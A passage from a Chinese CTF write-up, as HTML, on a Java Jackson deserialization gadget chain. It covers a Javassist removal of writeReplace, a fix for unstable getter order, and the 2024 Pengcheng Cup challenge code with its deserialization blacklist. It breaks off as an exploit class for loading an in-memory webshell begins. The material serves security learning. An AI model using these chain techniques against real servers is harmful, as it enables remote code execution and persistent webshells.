        filed<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1731926734226-1508e98f-629d-444f-9292-11e64c966102.png" alt="img"></p>
<p>在序列化的时候会报这个错误。我们调试能够发现，这个报错是由于在序列化 ArrayNode 对象的时候，由于父类的父类 BaseJsonNode 有 writeReplace 方法会替代原始的序列化对象的方法。所以我们只需要通过 Javassist 来动态修改类，将该方法删除就行。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.fasterxml.jackson.databind.node.BaseJsonNode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">CtMethod</span> writeReplace <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"writeReplace"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ctClass<span class="token punctuation">.</span><span class="token function">removeMethod</span><span class="token punctuation">(</span>writeReplace<span class="token punctuation">)</span><span class="token punctuation">;</span>
ctClass<span class="token punctuation">.</span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这样就能使其不报错还正常触发链子。</p>
<h3 id="不稳定解决方式"><a href="#不稳定解决方式" class="headerlink" title="不稳定解决方式"></a>不稳定解决方式</h3><p>我们上面通过 ArrayNode 来触发这一整条链子是由缺陷的，当我们在正常运行时，有可能会触发下面的报错</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span>JsonMappingException</span><span class="token operator">:</span> <span class="token punctuation">(</span>was <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>NullPointerException</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>through reference chain<span class="token operator">:</span> <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span>TemplatesImpl</span><span class="token punctuation">[</span><span class="token string">"stylesheetDOM"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1731930196394-8183749a-1182-4c65-8a39-9ce869880ad7.png" alt="img"></p>
<p>这个的原因时我们在调用 getter 方法的时候，他这个调用顺序时随机的，有的时候会调到我们不想要的 getter 类</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1731930482556-77bf7f93-88d4-4367-863f-a22d537792e9.png" alt="img"></p>
<p>在调用 getOutPutProperty 方法前，会先都用 getStylesheetDOM 这个方法，这时的这时候_sdom为null会导致报错，中断整个链子的反序列化过程，这里只需找个代理对象，即可，在之前 cc 链中又有讲，就不多做描述了。</p>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="2024-鹏程杯"><a href="#2024-鹏程杯" class="headerlink" title="2024 鹏程杯"></a>2024 鹏程杯</h4><p>这道题的大致代码如下：</p>
<p>hello.java</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>backdoor<span class="token punctuation">.</span>classes</span><span class="token punctuation">;</span>

<span class="token comment">// 引入所需的包和类</span>

<span class="token keyword">import</span> <span class="token namespace">backdoor<span class="token punctuation">.</span>classes<span class="token punctuation">.</span>look</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span></span><span class="token punctuation">;</span>

<span class="token comment">// 定义了一个名为 "hello" 的类，该类实现了 Serializable 接口</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> hello <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>

    <span class="token comment">// 定义了一个名为 "name" 的私有字符串变量</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>

    <span class="token comment">// 定义了一个名为 "eval" 的方法，该方法没有返回值</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 使用 "name" 变量的值来实例化一个 "look" 对象，并调用该对象的 "runcmd" 方法</span>
            <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token function">look</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">runcmd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 捕获异常并抛出运行时异常，传入捕获到的异常信息</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// 重写 hashCode 方法</span>
    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 调用 "eval" 方法</span>
        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 返回 "name" 字符串的哈希值，如果 "name" 为 null，则返回 0</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>look.java</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">backdoor<span class="token punctuation">.</span>classes</span><span class="token punctuation">;</span>



<span class="token comment">// 引入了所需的包和类</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">InitialContext</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span></span><span class="token punctuation">;</span>

<span class="token comment">// 定义一个名为 "look" 的类，实现了 Serializable 接口</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> look <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>

    <span class="token comment">// 定义了一个私有字符串变量 "cmd"，用于存储传入的命令</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> cmd<span class="token punctuation">;</span>

    <span class="token comment">// 构造方法，接收一个字符串参数并赋值给 "cmd" 变量</span>
    <span class="token keyword">public</span> <span class="token function">look</span><span class="token punctuation">(</span><span class="token class-name">String</span> s<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>cmd <span class="token operator">=</span> s<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// 定义了一个 "runcmd" 方法，返回类型为 String，抛出 NamingException</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">runcmd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 打印正在进行的查找操作，输出格式为 "lookup for: &lt;cmd>"</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"lookup for: "</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建一个 JNDI 的初始上下文（InitialContext），用于查找资源</span>
        <span class="token class-name">InitialContext</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 使用上下文执行查找操作，根据 "cmd" 字符串查找相应的资源</span>
        <span class="token class-name">Object</span> result <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 打印查找结果，输出格式为 "result: &lt;result>"</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"result: "</span> <span class="token operator">+</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 返回字符串 "1"，表示方法正常完成（不一定是实际结果）</span>
        <span class="token keyword">return</span> <span class="token string">"1"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>IndexController.java</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>backdoor<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span>




<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InvalidClassException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>


<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMethod</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestParam</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@RestController</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/des"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">POST</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"base64Data"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> base64Data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>base64Data<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serializedData <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getMimeDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>base64Data<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> option <span class="token operator">=</span> <span class="token function">deserializeData</span><span class="token punctuation">(</span>serializedData<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> option<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">deserializeData</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serializedData<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">ByteArrayInputStream</span> bis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>serializedData<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>backdoor<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>MyInputstream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>backdoor<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>MyInputstream</span><span class="token punctuation">(</span>bis<span class="token punctuation">)</span><span class="token punctuation">;</span>
            ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            ois<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            bis<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token string">"success"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvalidClassException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token string">"hacker"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token string">"error"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>MyInputstream.java</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>backdoor<span class="token punctuation">.</span>util</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>backdoor<span class="token punctuation">.</span>classes<span class="token punctuation">.</span>hello</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InvalidClassException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectStreamClass</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Hashtable</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyInputstream</span> <span class="token keyword">extends</span> <span class="token class-name">ObjectInputStream</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token class-name">ArrayList</span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">MyInputstream</span><span class="token punctuation">(</span><span class="token class-name">InputStream</span> in<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">resolveClass</span><span class="token punctuation">(</span><span class="token class-name">ObjectStreamClass</span> desc<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">TemplatesImpl</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>hello<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">HashMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Hashtable</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>list<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidClassException</span><span class="token punctuation">(</span><span class="token string">"nonono"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这道题的题目环境是不出网的，现在，存在 home 依赖和 spring-boot ，我们正好用 二次反序列化打 jackson 链载入内存马。payload 如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>demos<span class="token punctuation">.</span>web</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>node<span class="token punctuation">.</span></span><span class="token class-name">ArrayNode</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">EqualsBean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ObjectBean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">KeyPair</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">KeyPairGenerator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">Signature</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">SignedObject</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashSet</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JacksonPayload</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
